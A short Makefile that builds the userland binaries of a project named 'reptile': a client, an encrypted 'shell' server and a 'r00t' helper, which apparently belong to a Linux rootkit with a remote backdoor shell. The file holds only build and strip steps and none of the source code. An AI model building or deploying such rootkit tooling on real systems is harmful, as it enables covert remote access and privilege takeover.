MODULE=reptile
CLIENT_OBJ=pel.c aes.c sha1.c client.c
SERVER_OBJ=pel.c aes.c sha1.c shell.c

all:
	gcc -O -W -Wall -o $(MODULE)_client  $(CLIENT_OBJ)
	gcc -O -W -Wall -o $(MODULE)_shell $(SERVER_OBJ) -lutil -DLINUX
	gcc -Wall r00t.c -o $(MODULE)_r00t
	strip $(MODULE)*
	cp $(MODULE)* ../bin

clean:
	rm -f $(MODULE)* config.h
